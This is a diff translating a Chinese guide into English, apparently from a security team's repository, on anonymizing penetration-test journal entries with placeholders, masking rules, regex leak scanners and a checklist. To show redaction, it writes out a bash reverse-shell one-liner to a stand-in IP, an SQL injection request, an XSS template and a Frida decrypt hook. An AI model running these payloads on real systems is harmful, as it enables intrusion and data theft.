@@ -1,189 +1,189 @@
-# Field-Journal 脱敏规范
+# Field-Journal Anonymization Standard
 
-> 写 field-journal、提交 PR、分享 payload、对外发报告时**必须脱敏**。下面这套占位符规范借鉴自 PentAGI 多 agent 系统的 anonymization 协议，目标是：**保留可复用价值的同时，不暴露真实目标**。
+> Anonymization is **mandatory** when writing a field-journal entry, submitting a PR, sharing a payload or sending a report externally. The placeholder standard below draws on the anonymization protocol of the PentAGI multi-agent system, and the goal is: **keep the reusable value while never exposing the real target**.
 
-## 占位符总表
+## Master Placeholder Table
 
-### 网络与主机
+### Network and Hosts
 
-| 类型 | 占位符 | 适用场景 |
+| Type | Placeholder | Applies to |
 |------|-------|---------|
-| 目标 IP | `{target_ip}` | 渗透目标主机 |
-| 受害方 IP | `{victim_ip}` | 内网横向移动中的下一跳 |
-| 远程主机 | `{remote_host}` | 通用远程地址 |
-| 服务器 IP | `{server_ip}` | C2 / 中转 / 公网回连 |
-| 回调域名 | `{callback_domain}` | OOB / 反弹 |
-| 目标域名 | `{target_domain}` | Web / 邮件目标 |
-| 受害域名 | `{victim_domain}` | 内网域名 |
-| 自定义端口 | `{port}` | 非标准端口 |
-| 标准端口 | 保留原值 | 80 / 443 / 22 / 445 / 3389 等保留，便于复用 |
+| Target IP | `{target_ip}` | The host being tested |
+| Victim IP | `{victim_ip}` | The next hop during internal lateral movement |
+| Remote host | `{remote_host}` | Generic remote address |
+| Server IP | `{server_ip}` | C2 / relay / public callback |
+| Callback domain | `{callback_domain}` | OOB / reverse shell |
+| Target domain | `{target_domain}` | Web / mail target |
+| Victim domain | `{victim_domain}` | Internal domain |
+| Custom port | `{port}` | Non-standard port |
+| Standard port | Keep the original value | Keep 80 / 443 / 22 / 445 / 3389 and similar so the notes stay reusable |
 
-### 凭证与密钥
+### Credentials and Keys
 
-| 类型 | 占位符 |
+| Type | Placeholder |
 |------|-------|
-| 用户名 | `{username}` |
-| 密码 | `{password}` |
-| 哈希值 | `{hash}` |
-| 会话 token | `{token}` |
+| Username | `{username}` |
+| Password | `{password}` |
+| Hash | `{hash}` |
+| Session token | `{token}` |
 | API key | `{api_key}` |
 | Cookie | `{cookie}` |
 | Bearer | `{bearer_token}` |
 
-### URL 与端点
+### URLs and Endpoints
 
-| 类型 | 占位符 |
+| Type | Placeholder |
 |------|-------|
-| 通用 URL | `{url}` |
-| API 端点 | `{api_endpoint}` |
-| 回调 URL | `{callback_url}` |
-| 上传点 | `{upload_endpoint}` |
-| 登录接口 | `{login_endpoint}` |
+| Generic URL | `{url}` |
+| API endpoint | `{api_endpoint}` |
+| Callback URL | `{callback_url}` |
+| Upload endpoint | `{upload_endpoint}` |
+| Login endpoint | `{login_endpoint}` |
 
-### 路径
+### Paths
 
-| 类型 | 占位符 |
+| Type | Placeholder |
 |------|-------|
-| 安装目录 | `{install_dir}` |
-| 配置文件 | `{config_path}` |
-| Web 根 | `{webroot}` |
-| 上传目录 | `{upload_dir}` |
-| 日志路径 | `{log_path}` |
+| Install directory | `{install_dir}` |
+| Configuration file | `{config_path}` |
+| Web root | `{webroot}` |
+| Upload directory | `{upload_dir}` |
+| Log path | `{log_path}` |
 
-### 业务标识
+### Business Identifiers
 
-| 类型 | 占位符 |
+| Type | Placeholder |
 |------|-------|
-| 真实姓名 | `{user_name}` |
-| 邮箱 | `{user_email}` |
-| 手机号 | `{phone}` |
-| 工号 | `{employee_id}` |
-| 订单号 | `{order_id}` |
+| Real name | `{user_name}` |
+| Email | `{user_email}` |
+| Phone number | `{phone}` |
+| Employee ID | `{employee_id}` |
+| Order ID | `{order_id}` |
 | UUID | `{uuid}` |
 
-## 不要脱敏的东西
+## What Not to Anonymize
 
-为了保留经验的可复用性，下列内容**不要替换**：
+To keep the experience reusable, **do not replace** the following:
 
-- CVE 编号（`CVE-2024-1234`）
-- 工具名与版本（`sqlmap 1.7.10`）
-- 标准端口（80 / 443 / 445 / 1433 / 3306 等）
-- 公开的 OS 版本（`Windows Server 2019`、`Ubuntu 22.04`）
-- 通用 payload 模板（`<script>alert(1)</script>`、`' OR 1=1--`）
-- 库名与函数名（`OpenSSL`、`memcpy`、`strncpy`）
-- 协议名与字段名（`Kerberos AS-REQ`、`LDAP bind`）
+- CVE identifiers (`CVE-2024-1234`)
+- Tool names and versions (`sqlmap 1.7.10`)
+- Standard ports (80 / 443 / 445 / 1433 / 3306 and similar)
+- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
+- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
+- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
+- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)
 
-## 上下文保留原则
+## The Context Preservation Principle
 
-替换时**保留语义结构**，让别人看到也知道这是什么：
+When replacing values, **keep the semantic structure** so a reader can still tell what it is:
 
 ```python
-# ❌ 全替换成 X，看不出语义
+# ❌ Replacing everything with X destroys the meaning
 target = "X"
 url = "X/X"
 
-# ❌ 替换太通用
+# ❌ The replacement is too generic
 target = "{target}"
 url = "{url}"
 
-# ✅ 保留上下文
+# ✅ Context preserved
 target_ip = "{target_ip}"           # 192.168.10.50
 target_url = "{target_url}/admin"   # https://corp.example.com/admin
 admin_token = "{admin_session_token}"  # eyJhbGciOi...
 ```
 
-## Payload 脱敏
+## Payload Anonymization
 
 ### Web payload
 
 ```
-原始: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
-      Host: shop.victim-corp.cn
-      Cookie: PHPSESSID=abcdef123456
+Original:   GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
+            Host: shop.victim-corp.cn
+            Cookie: PHPSESSID=abcdef123456
 
-脱敏: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
-      Host: {target_domain}
-      Cookie: PHPSESSID={session_id}
+Anonymized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
+            Host: {target_domain}
+            Cookie: PHPSESSID={session_id}
 ```
 
 ### Shell payload
 
 ```bash
-# 原始
+# Original
 bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'
 
-# 脱敏
+# Anonymized
 bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
 ```
 
-### Frida hook 脚本
+### Frida hook script
 
 ```javascript
-// 原始
+// Original
 Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
     var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
     ...
 };
 
-// 脱敏
+// Anonymized
 Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
     var result = this.decrypt("{sample_ciphertext}");
     ...
 };
 ```
 
-## 二进制样本脱敏
+## Binary Sample Anonymization
 
-### 哈希
+### Hashes
 
-记录 sha256 即可，**不要附原文件**。如果必须共享样本：
+Record the sha256 only, **never attach the original file**. If a sample must be shared:
 
-- 上 VirusTotal 或 MalwareBazaar 公开样本库
-- 链接到他人已分析过的同 hash 样本
+- Upload it to a public sample repository such as VirusTotal or MalwareBazaar
+- Link to someone else's existing analysis of the same hash
 
-### 字符串与符号
+### Strings and Symbols
 
 ```c
-// 原始
+// Original
 char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
 const char *api = "https://api.target-corp.com/v3/auth";
 
-// 脱敏
+// Anonymized
 char *secret = "Bearer {hardcoded_jwt}";
 const char *api = "{api_endpoint}";
 ```
 
-## 截图脱敏
+## Screenshot Anonymization
 
-- 用马赛克或纯黑遮挡：用户名、邮箱、电话、订单号、姓名
-- URL 栏只露域名结构（保留路径，遮 host），或全替换
-- 内网 IP 段保留前两段：`10.0.x.x` 而不是 `10.0.10.50`
-- 标识企业身份的图片元素（logo / 水印）必须遮
+- Blur or black out: usernames, emails, phone numbers, order IDs, personal names
+- In the URL bar, expose only the domain structure (keep the path, mask the host), or replace it entirely
+- Keep only the first two octets of internal IP ranges: `10.0.x.x` rather than `10.0.10.50`
+- Image elements that identify the company (logos, watermarks) must be masked
 
-## CTF 场景特例
+## The CTF Special Case
 
-CTF 题目题面、靶机 hostname、flag 格式**通常不算敏感**（靶机是公开题），但：
+CTF challenge descriptions, target machine hostnames and flag formats are **usually not sensitive** (the target machines are public challenges), but:
 
-- 自部署的私有靶场要按真实环境对待
-- 比赛结束前的 flag 不能公开
-- 别人未公开的解法不要直接抄到 field-journal
+- A privately deployed range you built yourself must be treated like a real environment
+- Flags must not be published before the competition ends
+- Do not copy someone else's unpublished solution straight into a field-journal entry
 
-## 自动检测脚本
+## Automated Detection Script
 
-写 field-journal 后跑一遍下面的正则，找出漏脱敏：
+After writing a field-journal entry, run the regexes below to catch anything you forgot to redact:
 
 ```powershell
 # Windows PowerShell
 $file = "field-journal/2026-05-15_xxx.md"
 $content = Get-Content $file -Raw
 
-# 公网 IPv4
+# Public IPv4
 [regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }
 
-# 邮箱
+# Email
 [regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }
 
-# 中国大陆手机号
+# Mainland China mobile numbers
 [regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }
 
 # JWT
@@ -191,32 +191,32 @@ $content = Get-Content $file -Raw
 ```
 
 ```bash
-# Bash / Linux 等价
+# Bash / Linux equivalents
 grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
 grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
 grep -nE '\b1[3-9][0-9]{9}\b' file.md
 ```
 
-把这段封装成一个 `field-journal/scripts/scan-leaks.ps1`，每次提交前跑。
+Wrap this up as `field-journal/scripts/scan-leaks.ps1` and run it before every submission.
 
-## 反向：阅读他人脱敏文档
+## The Reverse Case: Reading Someone Else's Anonymized Docs
 
-看别人的 field-journal / writeup 时，遇到 `{target_ip}` 这类占位符，**不要替换成你自己环境的真实值再 commit**，保持占位符不变即可。
+When reading someone else's field-journal or writeup and you hit a placeholder such as `{target_ip}`, **do not substitute the real values from your own environment and then commit**; leave the placeholders as they are.
 
-## Field-Journal 必查项
+## Field-Journal Mandatory Checklist
 
-提交 field-journal 前对照这个 checklist：
+Go through this checklist before submitting a field-journal entry:
 
 ```
-□ 没有公网 IP（除了 CDN / 公开服务）
-□ 没有真实域名（除了 example.com 等示范域）
-□ 没有真实凭证 / token / hash（已替换为 {placeholder}）
-□ 没有截图里漏出的姓名 / 工号 / 邮箱
-□ 没有 sample 文件本身（只留 sha256）
-□ JWT / OAuth code / API key 全替换
-□ 内网 IP 段已模糊到前两段（10.0.x.x）
-□ Payload 里的目标参数已替换为通用占位符
-□ Cookie 与 session id 已替换
+□ No public IPs (other than CDNs / public services)
+□ No real domains (other than demonstration domains such as example.com)
+□ No real credentials / tokens / hashes (replaced with {placeholder})
+□ No names / employee IDs / emails left visible in screenshots
+□ No sample file itself (keep only the sha256)
+□ Every JWT / OAuth code / API key replaced
+□ Internal IP ranges blurred to the first two octets (10.0.x.x)
+□ Target-specific parameters in payloads replaced with generic placeholders
+□ Cookies and session IDs replaced
 ```
 
-把这个 checklist 直接补到 `field-journal/_template.md` 末尾。
+Append this checklist directly to the end of `field-journal/_template.md`.
